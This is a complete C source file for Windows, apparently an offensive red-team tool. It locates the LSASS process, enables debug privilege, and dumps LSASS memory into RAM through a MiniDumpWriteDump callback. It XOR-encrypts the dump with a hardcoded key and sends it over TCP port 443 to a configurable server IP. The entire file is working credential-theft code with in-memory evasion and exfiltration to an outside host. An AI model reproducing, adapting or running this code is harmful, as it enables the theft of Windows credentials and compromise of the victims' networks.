#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <ws2tcpip.h> // For InetPton

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Ws2_32.lib")

// Configuration
#define DUMP_BUFFER_SIZE (1024 * 1024 * 200) // 200MB
const char* XOR_KEY = "jisjidpa123";
const char* DEST_IP = "10.10.10.133"; // Change to your server IP
const int DEST_PORT = 443;

// Global variables
LPVOID dumpBuffer = NULL;
DWORD dumpSize = 0;

// Callback routine for MiniDumpWriteDump
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        printf("[+] Starting dump to memory buffer\n");
        break;
    case IoWriteAllCallback:
        // Copy chunk to our buffer
        memcpy(
            (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset),
            CallbackInput->Io.Buffer,
            CallbackInput->Io.BufferBytes
        );
        dumpSize += CallbackInput->Io.BufferBytes;
        CallbackOutput->Status = S_OK;
        break;
    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        printf("[+] Copied %i bytes to memory buffer\n", dumpSize);
        break;
    }
    return TRUE;
}

// XOR encryption
void XOR(char* data, int data_len, char* key, int key_len) {
    for (int i = 0, j = 0; i < data_len; i++) {
        data[i] ^= key[j];
        j = (j + 1) % key_len;
    }
}

// Enable debug privilege
BOOL SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("[-] Could not get process token: %d\n", GetLastError());
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        printf("[-] LookupPrivilegeValue failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        printf("[-] AdjustTokenPrivileges failed: %d\n", GetLastError());
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

// Find PID of a process by name
DWORD FindPID(const char* procname) {
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        return 0;
    }

    if (!Process32First(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        char szExeFile[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, szExeFile, MAX_PATH, NULL, NULL);
        if (_stricmp(procname, szExeFile) == 0) {
            CloseHandle(snapshot);
            return pe.th32ProcessID;
        }
    } while (Process32Next(snapshot, &pe));

    CloseHandle(snapshot);
    return 0;
}

// Transfer data over network
BOOL TransferData(const char* data, DWORD size) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed: %d\n", WSAGetLastError());
        return FALSE;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }

    // Set timeout (5 seconds)
    DWORD timeout = 5000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    SOCKADDR_IN serverAddr = { 0 };
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEST_PORT);
    if (InetPtonA(AF_INET, DEST_IP, &serverAddr.sin_addr) <= 0) {
        printf("[-] Invalid server address\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    printf("[+] Connecting to %s:%d...\n", DEST_IP, DEST_PORT);
    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("[-] Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    printf("[+] Connected. Sending data...\n");

    // Send size first
    if (send(sock, (const char*)&size, sizeof(DWORD), 0) == SOCKET_ERROR) {
        printf("[-] Failed to send size: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    // Send data in chunks
    DWORD bytesSent = 0;
    while (bytesSent < size) {
        int chunk = min(4096, size - bytesSent);
        int result = send(sock, data + bytesSent, chunk, 0);
        if (result == SOCKET_ERROR) {
            printf("[-] Send failed at %u/%u bytes: %d\n",
                bytesSent, size, WSAGetLastError());
            closesocket(sock);
            WSACleanup();
            return FALSE;
        }
        bytesSent += result;
        printf("[+] Sent %u/%u bytes (%.2f%%)\r", bytesSent, size, (float)bytesSent / size * 100);
    }

    printf("\n[+] Transfer completed (%u bytes sent)\n", bytesSent);
    closesocket(sock);
    WSACleanup();
    return TRUE;
}

int main() {
    // Allocate dump buffer
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DUMP_BUFFER_SIZE);
    if (!dumpBuffer) {
        printf("[-] Failed to allocate memory\n");
        return 1;
    }

    // Find LSASS PID
    printf("[+] Searching for LSASS PID\n");
    DWORD pid = FindPID("lsass.exe");
    if (pid == 0) {
        printf("[-] Could not find LSASS PID\n");
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }
    printf("[+] LSASS PID: %i\n", pid);

    // Enable debug privilege
    if (!SetDebugPrivilege()) {
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    // Open handle to LSASS
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProc == NULL) {
        printf("[-] Could not open handle to LSASS process: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    // Configure minidump callback
    MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
    CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

    // Dump LSASS memory
    printf("[+] Dumping LSASS memory...\n");
    if (!MiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo)) {
        printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
        CloseHandle(hProc);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }
    CloseHandle(hProc);

    // Encrypt the dump
    printf("[+] Encrypting dump data with key: %s\n", XOR_KEY);
    XOR((char*)dumpBuffer, dumpSize, (char*)XOR_KEY, (int)strlen(XOR_KEY));

    // Transfer the encrypted dump
    printf("[+] Transferring encrypted dump to %s:%d\n", DEST_IP, DEST_PORT);
    if (!TransferData((const char*)dumpBuffer, dumpSize)) {
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    // Cleanup
    HeapFree(GetProcessHeap(), 0, dumpBuffer);
    printf("[+] Operation completed successfully\n");
    return 0;
}
